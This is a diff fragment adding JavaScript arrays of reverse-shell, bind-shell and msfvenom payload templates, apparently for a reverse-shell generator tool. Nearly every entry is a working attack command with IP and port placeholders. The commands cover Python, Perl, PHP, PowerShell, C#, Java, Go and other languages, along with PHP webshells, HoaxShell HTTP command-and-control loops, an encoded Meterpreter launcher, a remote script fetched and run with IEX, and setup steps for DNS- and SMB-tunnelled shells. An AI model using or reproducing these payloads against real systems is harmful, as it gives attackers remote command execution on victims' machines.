+  { name:'Python3 Windows',meta:['windows'],         cmd:'import os,socket,subprocess,threading\ndef s2p(s, p):\n    while True:\n        data = s.recv(1024)\n        if len(data) > 0:\n            p.stdin.write(data)\n            p.stdin.flush()\ndef p2s(s, p):\n    while True:\n        s.send(p.stdout.read(1))\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("{ip}",{port}))\np=subprocess.Popen(["{shell}"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\ns2p_thread = threading.Thread(target=s2p, args=[s, p])\ns2p_thread.daemon = True\ns2p_thread.start()\np2s_thread = threading.Thread(target=p2s, args=[s, p])\np2s_thread.daemon = True\np2s_thread.start()\ntry:\n    p.wait()\nexcept KeyboardInterrupt:\n    s.close()' },
+  { name:'Python2',        meta:['linux','mac'],     cmd:"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'" },
+
+  // ── PERL ──
+  { name:'Perl',           meta:['linux','mac'],     cmd:'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};\'' },
+  { name:'Perl no sh',     meta:['linux','mac'],     cmd:'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'' },
+
+  // ── PHP ──
+  { name:'PHP exec',       meta:['linux','mac'],     cmd:'php -r \'$sock=fsockopen("{ip}",{port});exec("{shell} <&3 >&3 2>&3");\'' },
+  { name:'PHP shell_exec', meta:['linux','mac'],     cmd:'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("{shell} <&3 >&3 2>&3");\'' },
+  { name:'PHP system',     meta:['linux','mac','windows'], cmd:'php -r \'$sock=fsockopen("{ip}",{port});system("{shell} <&3 >&3 2>&3");\'' },
+  { name:'PHP passthru',   meta:['linux','mac'],     cmd:'php -r \'$sock=fsockopen("{ip}",{port});passthru("{shell} <&3 >&3 2>&3");\'' },
+  { name:'PHP popen',      meta:['linux','mac','windows'], cmd:'php -r \'$sock=fsockopen("{ip}",{port});popen("{shell} <&3 >&3 2>&3", "r");\'' },
+  { name:'PHP proc_open',  meta:['linux','mac','windows'], cmd:'php -r \'$s=fsockopen("{ip}",{port});proc_open("{shell}",[$s,$s,$s],$p);\'' },
+  { name:'PHP PentestMonkey', meta:['linux','mac','windows'], cmd:"<?php\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '{ip}';\n$port = {port};\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; {shell} -i';\n$daemon = 0;\n$debug = 0;\nif (function_exists('pcntl_fork')) {\n  $pid = pcntl_fork();\n  if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); }\n  if ($pid) { exit(0); }\n  if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); }\n  $daemon = 1;\n} else { printit(\"WARNING: Failed to daemonise.\"); }\nchdir(\"/\"); umask(0);\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) { printit(\"$errstr ($errno)\"); exit(1); }\n$descriptorspec = array(0=>array(\"pipe\",\"r\"),1=>array(\"pipe\",\"w\"),2=>array(\"pipe\",\"w\"));\n$process = proc_open($shell, $descriptorspec, $pipes);\nif (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); }\nstream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0);\nwhile (1) {\n  if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; }\n  if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; }\n  $read_a = array($sock, $pipes[1], $pipes[2]);\n  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n  if (in_array($sock, $read_a)) {\n    $input = fread($sock, $chunk_size); fwrite($pipes[0], $input);\n  }\n  if (in_array($pipes[1], $read_a)) {\n    $input = fread($pipes[1], $chunk_size); fwrite($sock, $input);\n  }\n  if (in_array($pipes[2], $read_a)) {\n    $input = fread($pipes[2], $chunk_size); fwrite($sock, $input);\n  }\n}\nfclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process);\nfunction printit ($string) { if (!$daemon) { print \"$string\\n\"; } }\n?>" },
+  { name:'PHP cmd webshell', meta:['linux','mac','windows'], cmd:"<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }?>" },
+  { name:'PHP one-liner',  meta:['linux','mac','windows'], cmd:"<?=`$_GET[0]`?>" },
+
+  // ── POWERSHELL ──
+  { name:'PowerShell #1',  meta:['windows'],         cmd:'$LHOST = "{ip}"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()' },
+  { name:'PowerShell #2',  meta:['windows'],         cmd:'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"' },
+  { name:'PowerShell #3',  meta:['windows'],         cmd:'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'{ip}\', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()}WriteToStream \'\';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"' },
+  { name:'PowerShell #4 TLS', meta:['windows'],      encrypted:true, cmd:'$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient(\'{ip}\', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient(\'cloudflare-dns.com\',$null,$sslProtocols,$false);$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096;$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()};WriteToStream \'\';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()' },
+  { name:'Windows ConPty',  meta:['windows'],        cmd:'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}' },
+
+  // ── C / C# ──
+  { name:'C (Linux)',      meta:['linux','mac'],     cmd:'#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;\n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr("{ip}");\n    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n    char * const argv[] = {"{shell}", NULL};\n    execvp("{shell}", argv);\n    return 0;\n}' },
+  { name:'C# TCP Client',  meta:['linux','windows'], cmd:'using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.Net;\nusing System.Net.Sockets;\n\nnamespace ConnectBack {\n  public class Program {\n    static StreamWriter streamWriter;\n    public static void Main(string[] args) {\n      using(TcpClient client = new TcpClient("{ip}", {port})) {\n        using(Stream stream = client.GetStream()) {\n          using(StreamReader rdr = new StreamReader(stream)) {\n            streamWriter = new StreamWriter(stream);\n            StringBuilder strInput = new StringBuilder();\n            Process p = new Process();\n            p.StartInfo.FileName = "{shell}";\n            p.StartInfo.CreateNoWindow = true;\n            p.StartInfo.UseShellExecute = false;\n            p.StartInfo.RedirectStandardOutput = true;\n            p.StartInfo.RedirectStandardInput = true;\n            p.StartInfo.RedirectStandardError = true;\n            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n            p.Start();\n            p.BeginOutputReadLine();\n            while(true) {\n              strInput.Append(rdr.ReadLine());\n              p.StandardInput.WriteLine(strInput);\n              strInput.Remove(0, strInput.Length);\n            }\n          }\n        }\n      }\n    }\n    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) {\n      if (!String.IsNullOrEmpty(outLine.Data)) {\n        try { streamWriter.WriteLine(outLine.Data); streamWriter.Flush(); } catch (Exception err) { }\n      }\n    }\n  }\n}' },
+
+  // ── RUBY ──
+  { name:'Ruby #1',        meta:['linux','mac'],     cmd:"ruby -rsocket -e'spawn(\"{shell}\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'" },
+  { name:'Ruby no sh',     meta:['linux','mac'],     cmd:"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'" },
+
+  // ── NODE.JS ──
+  { name:'Node.js',        meta:['linux','mac'],     cmd:"require('child_process').exec('nc -e {shell} {ip} {port}')" },
+  { name:'Node.js #2',     meta:['linux','mac','windows'], cmd:"(function(){\n  var net = require(\"net\"),\n      cp = require(\"child_process\"),\n      sh = cp.spawn(\"{shell}\", []);\n  var client = new net.Socket();\n  client.connect({port}, \"{ip}\", function(){\n    client.pipe(sh.stdin);\n    sh.stdout.pipe(client);\n    sh.stderr.pipe(client);\n  });\n  return /a/;\n})();" },
+
+  // ── JAVA ──
+  { name:'Java #1',        meta:['linux','mac'],     cmd:'public class shell {\n  public static void main(String[] args) {\n    Process p;\n    try {\n      p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1");\n      p.waitFor();\n      p.destroy();\n    } catch (Exception e) {}\n  }\n}' },
+  { name:'Java #2',        meta:['linux','mac','windows'], cmd:'import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class shell {\n  public static void main(String[] args) {\n    String host = "{ip}";\n    int port = {port};\n    String cmd = "{shell}";\n    try {\n      Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n      Socket s = new Socket(host, port);\n      InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n      OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n      while (!s.isClosed()) {\n        while (pi.available() > 0) so.write(pi.read());\n        while (pe.available() > 0) so.write(pe.read());\n        while (si.available() > 0) po.write(si.read());\n        so.flush(); po.flush();\n        Thread.sleep(50);\n        try { p.exitValue(); break; } catch (Exception e) {}\n      }\n      p.destroy(); s.close();\n    } catch (Exception e) {}\n  }\n}' },
+
+  // ── GOLANG ──
+  { name:'Golang',         meta:['linux','mac','windows'], cmd:"echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" },
+
+  // ── LUA ──
+  { name:'Lua #1',         meta:['linux'],           cmd:"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\"" },
+  { name:'Lua #2',         meta:['linux','windows'], cmd:"lua5.1 -e 'local host, port = \"{ip}\", {port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'" },
+
+  // ── AWK ──
+  { name:'Awk',            meta:['linux','mac'],     cmd:'awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null' },
+
+  // ── GROOVY ──
+  { name:'Groovy',         meta:['windows'],         cmd:'String host="{ip}";int port={port};String cmd="{shell}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();' },
+
+  // ── DART ──
+  { name:'Dart',           meta:['linux','mac','windows'], cmd:"import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"{ip}\", {port}).then((socket) {\n    socket.listen((data) {\n      Process.start('{shell}', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}" },
+
+  // ── CRYSTAL ──
+  { name:'Crystal',        meta:['linux','mac','windows'], cmd:"crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{ip}\",{port});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'" },
+
+  // ── SQLITE3 ──
+  { name:'sqlite3 mkfifo', meta:['linux','mac'],     cmd:"sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'" },
+
+  // ── RUSTCAT ──
+  { name:'rustcat',        meta:['linux','mac'],     cmd:'rcat connect -s {shell} {ip} {port}' },
+
+  // ── VLANG ──
+  { name:'Vlang',          meta:['linux','mac'],     cmd:"echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e {shell} {ip} {port} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v" },
+
+  // ── HASKELL ──
+  { name:'Haskell',        meta:['linux','mac'],     cmd:"module Main where\nimport System.Process\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f\"" },
+
+  // ── CHASHELL (DNS reverse shell) ──
+  { name:'Chashell (DNS)',  meta:['linux','mac','windows'], encrypted:true,
+    cmd:'# Run on target after build:\n./chashell\n# (DNS traffic tunnels to chaserv on attacker)',
+    setup:[
+      { title:'Clone & enter repo', cmd:'git clone https://github.com/kost/chashell && cd chashell' },
+      { title:'Generate encryption key', cmd:'export ENCRYPTION_KEY=$(python3 -c "import os,binascii; print(binascii.hexlify(os.urandom(32)).decode())")\nexport DOMAIN_NAME=c.yourdomain.com' },
+      { title:'Build all binaries', cmd:'make build-all\n# Cross-compile: make build-all OSARCH="windows/amd64"' },
+      { title:'Configure DNS records', cmd:'; Add to your domain zone:\nchashell 300 IN A <SERVERIP>\nc 300 IN NS chashell.<DOMAIN>.' },
+      { title:'Start listener (attacker)', cmd:'./chaserv' },
+      { title:'Execute on target', cmd:'./chashell  # or chashell.exe on Windows' },
+    ]
+  },
+
+  // ── FUEGOSHELL (SMB / Named Pipe) ──
+  { name:'FuegoShell Reverse (SMB/NamedPipe)', meta:['windows'],
+    cmd:'# Generate oneliner on attacker, paste on target:\npowershell -exec bypass .\\generate_reverse_fuegoshell.ps1',
+    setup:[
+      { title:'Clone repo', cmd:'git clone https://github.com/v1k1ngfr/fuegoshell && cd fuegoshell/fuegoshell' },
+      { title:'Generate reverse shell oneliner (attacker)', cmd:'powershell -exec bypass .\\generate_reverse_fuegoshell.ps1\n# Outputs a PS1 oneliner — copy & run on target' },
+      { title:'Why it works', cmd:'# Reuses TCP 445 (SMB) via named pipes — no new listening port\n# No local admin required, bypasses port-based firewall rules' },
+    ]
+  },
+  { name:'FuegoShell Bind (SMB/NamedPipe)', meta:['windows'],
+    cmd:'# Generate oneliner on target:\npowershell -exec bypass .\\generate_bind_fuegoshell.ps1',
+    setup:[
+      { title:'Clone repo', cmd:'git clone https://github.com/v1k1ngfr/fuegoshell && cd fuegoshell/fuegoshell' },
+      { title:'Generate bind shell oneliner', cmd:'powershell -exec bypass .\\generate_bind_fuegoshell.ps1\n# Outputs a PS1 oneliner — run on target to create bind shell on 445' },
+    ]
+  },
+
+  // ── SSL-AES Reverse Shell (C++) ──
+  { name:'SSL-AES Reverse Shell (C++)', meta:['windows'], encrypted:true,
+    cmd:'# After compiling:\nSSLReverseShell.exe {ip} {port}',
+    setup:[
+      { title:'Clone repo', cmd:'git clone https://github.com/V-i-x-x/SSL-AES-Reverse-Shell' },
+      { title:'Download & extract OpenSSL', cmd:'# Unzip OpenSSLWin64.zip → C:\\OpenSSLWin64\n# Required for linking libssl.lib + libcrypto.lib' },
+      { title:'Visual Studio config', cmd:'# C/C++ → Code Generation → Runtime Library: /MT\n# Additional Include: C:\\OpenSSLWin64\\install\\include\n# Additional Lib Dir: C:\\OpenSSLWin64\\install\\lib\n# Additional Dependencies: libssl.lib;libcrypto.lib' },
+      { title:'Start SSL listener (attacker)', cmd:'python3 sslserver.py {ip} {port}' },
+      { title:'Run on target', cmd:'SSLReverseShell.exe {ip} {port}' },
+    ]
+  },
+
+  // ── HOAXSHELL (HTTP/S polling) ──
+  { name:'HoaxShell CMD cURL (HTTP)', meta:['windows'], encrypted:true,
+    cmd:'@echo off&cmd /V:ON /C "SET ip={ip}:{port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1" > NUL' },
+  { name:'HoaxShell PowerShell IEX (HTTP)', meta:['windows'], encrypted:true,
+    cmd:"$s='{ip}:{port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}" },
+  { name:'HoaxShell PowerShell IEX (HTTPS)', meta:['windows'], encrypted:true,
+    cmd:"add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}" },
+  { name:'HoaxShell PowerShell Outfile (HTTP)', meta:['windows'], encrypted:true,
+    cmd:"$s='{ip}:{port}';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}" },
+  { name:'HoaxShell CMD cURL (HTTPS)', meta:['windows'], encrypted:true,
+    cmd:'@echo off&cmd /V:ON /C "SET ip={ip}:{port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1" > NUL' },
+
+  // ── EXTRA from cheatsheet ──
+  { name:'Xterm',          meta:['linux','mac'],     cmd:'xterm -display {ip}:1' },
+  { name:'Ncat Encryption',meta:['linux','mac'],     cmd:'ncat --ssl {ip} {port} -e {shell}', encrypted:true },
+  { name:'Bash /dev/tcp (exec)', meta:['linux','mac'], cmd:'exec 3<>/dev/tcp/{ip}/{port}; {shell} <&3 >&3 2>&3' },
+  { name:'Meterpreter PSH (b64)', meta:['windows'],  cmd:'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBpAHAAfQAiACwAewBwAG8AcgB0AH0AKQAKACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgA' },
+];
+
+const BIND = [
+  { name:'nc -e Bind',      meta:['linux','mac'],     cmd:'nc -nlvp {port} -e /bin/sh' },
+  { name:'nc.exe -e Bind',  meta:['windows'],         cmd:'nc.exe -nlvp {port} -e cmd' },
+  { name:'nc mkfifo Bind',  meta:['linux','mac'],     cmd:'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f' },
+  { name:'BusyBox nc Bind', meta:['linux'],           cmd:'busybox nc -lvp {port} -e /bin/sh' },
+  { name:'ncat -e Bind',    meta:['linux','mac'],     cmd:'ncat -nlvp {port} -e /bin/sh' },
+  { name:'ncat TLS Bind',   meta:['linux','mac'],     cmd:'ncat --ssl -lvp {port} -e /bin/sh', encrypted:true },
+  { name:'socat TTY Bind',  meta:['linux','mac'],     cmd:'socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane' },
+  { name:'Python3 Bind',    meta:['linux','mac','windows'], cmd:"python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"},
+  { name:'Perl Bind',       meta:['linux','mac'],     cmd:'perl -e \'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");};\'' },
+  { name:'PHP Bind',        meta:['linux','mac','windows'], cmd:'php -r \'$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}\''},
+  { name:'Ruby Bind',       meta:['linux','mac'],     cmd:'ruby -rsocket -e \'f=TCPServer.new({port}); s=f.accept; [0,1,2].each { |fd| IO.new(fd).reopen(s) }; exec "/bin/sh -i"\'' },
+  { name:'Golang Bind',     meta:['linux','mac','windows'], cmd:"echo 'package main;import(\"net\";\"os/exec\";\"os\");func main(){l,_:=net.Listen(\"tcp\",\"0.0.0.0:{port}\");c,_:=l.Accept();cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run();os.Exit(0)}' > /tmp/b.go && go run /tmp/b.go" },
+  { name:'Awk Bind',        meta:['linux','mac'],     cmd:'awk \'BEGIN{s="/inet/tcp/{port}/0/0";for(;;){s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}\' /dev/null' },
+  { name:'PowerShell Bind', meta:['windows'],         cmd:'$listener = [System.Net.Sockets.TcpListener]{port}; $listener.start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close(); $listener.Stop()' },
+];
+
+const MSFVENOM = [
+  // Windows
+  { name:'Win x64 Meterpreter Staged',    meta:['windows','staged'],   cmd:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe' },
+  { name:'Win x64 Meterpreter Stageless', meta:['windows','stageless'],cmd:'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe' },
+  { name:'Win x64 Shell Staged',          meta:['windows','staged'],   cmd:'msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe' },
+  { name:'Win x64 Shell Stageless',       meta:['windows','stageless'],cmd:'msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe' },
+  { name:'Win x64 ASPX Staged',           meta:['windows','staged'],   cmd:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx' },
+  { name:'Win JSP Staged',                meta:['windows','staged'],   cmd:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o rev.jsp' },
+  { name:'Win DLL Inject Stageless',      meta:['windows','stageless'],cmd:'msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f dll -o inject.dll' },
